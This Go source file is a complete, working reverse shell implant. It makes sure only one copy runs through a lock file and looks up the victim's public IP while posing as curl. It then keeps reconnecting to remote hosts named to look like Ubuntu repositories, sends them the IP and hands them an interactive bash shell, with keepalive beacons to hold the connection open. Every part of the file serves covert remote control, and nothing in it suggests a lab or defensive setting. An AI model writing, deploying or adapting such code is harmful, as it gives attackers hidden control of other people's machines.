package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
	"time"
)

const (
	LockFile    = "/tmp/cached_script.lock"
	PrimaryHost = "ubuntu-repo.strangled.net:8090"
	BackupHost  = "linux-x86-tcpudp.strangled.net:21"
)

// IPInfo matches the structure of the ipinfo.io JSON response
type IPInfo struct {
	IP string `json:"ip"`
}

func checkAndAcquireLock() {
	if _, err := os.Stat(LockFile); err == nil {
		data, err := os.ReadFile(LockFile)
		if err == nil {
			var oldPID int
			_, err := fmt.Sscanf(string(data), "%d", &oldPID)
			if err == nil {
				// Check if process is actively running
				process, err := os.FindProcess(oldPID)
				if err == nil {
					err = process.Signal(syscall.Signal(0))
					if err == nil {
						// Process is already running, exit cleanly
						os.Exit(0)
					}
				}
			}
		}
	}
	// Write current PID to lockfile
	_ = os.WriteFile(LockFile, []byte(fmt.Sprintf("%d", os.Getpid())), 0644)
}

func removeLock() {
	_ = os.Remove(LockFile)
}

func getPublicIP() string {
	client := &http.Client{Timeout: 4 * time.Second}
	req, err := http.NewRequest("GET", "http://ipinfo.io", nil)
	if err != nil {
		return "Unknown_IP"
	}
	req.Header.Set("User-Agent", "curl/7.68.0")

	resp, err := client.Do(req)
	if err != nil {
		return "Unknown_IP"
	}
	defer resp.Body.Close()

	var info IPInfo
	if err := json.NewDecoder(resp.Body).Decode(&info); err != nil {
		return "Unknown_IP"
	}
	if info.IP == "" {
		return "Unknown_IP"
	}
	return info.IP
}

func handleShellSession(conn net.Conn) {
	// Allocate a native interactive shell broker process
	cmd := exec.Command("/bin/bash", "-i")
	
	// Force an unbuffered interactive terminal environment profile
	cmd.Env = append(os.Environ(), "TERM=xterm-256color", "PYTHONUNBUFFERED=1")

	// Create structural pseudo-terminal pipes to link the socket natively
	stdinPipe, _ := cmd.StdinPipe()
	stdoutPipe, _ := cmd.StdoutPipe()
	stderrPipe, _ := cmd.StderrPipe()

	if err := cmd.Start(); err != nil {
		return
	}

	// Channel to signal process termination
	done := make(chan bool, 3)

	// Async Routine 1: Read inputs from your Dashboard UI and feed them straight into Bash stdin
	go func() {
		_, _ = io.Copy(stdinPipe, conn)
		done <- true
	}()

	// Async Routine 2: Capture stdout from Bash and stream it straight back to your Dashboard UI
	go func() {
		_, _ = io.Copy(conn, stdoutPipe)
		done <- true
	}()

	// Async Routine 3: Capture stderr from Bash and stream it straight back to your Dashboard UI
	go func() {
		_, _ = io.Copy(conn, stderrPipe)
		done <- true
	}()

	// Asynchronous Keepalive Beacon: Sends the quiet \x00 character every 5 seconds to prevent drops
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				_, err := conn.Write([]byte{0x00})
				if err != nil {
					done <- true
					return
				}
			case <-done:
				return
			}
		}
	}()

	// Block thread here until any copy pipe drops or the bash session exits natively
	<-done
	_ = cmd.Process.Kill()
}

func main() {
	checkAndAcquireLock()
	defer removeLock()

	// Handle standard kill signals to ensure lock file cleanup
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		removeLock()
		os.Exit(0)
	}()

	// Fetch public network metadata target address identity signature
	trueIP := getPublicIP()

	// Persistent, infinite resilience network wheel
	for {
		var conn net.Conn
		var err error

		// 1. Attempt connection to primary master destination target
		conn, err = net.DialTimeout("tcp", PrimaryHost, 3*time.Second)
		if err != nil {
			// 2. FALLBACK RETRY: Route through backup port 21 relay proxy if primary fails
			conn, err = net.DialTimeout("tcp", BackupHost, 3*time.Second)
		}

		if err == nil && conn != nil {
			// Blast your mandatory layout handshake validation IP string followed by newline (\n)
			_, err = conn.Write([]byte(trueIP + "\n"))
			if err == nil {
				// Launch full interactive dual-duplex stream loop brokerage session
				handleShellSession(conn)
			}
			_ = conn.Close()
		}

		// Sleep for 5 seconds before executing the recovery wheel cycle to protect CPU overhead
		time.Sleep(5 * time.Second)
	}
}
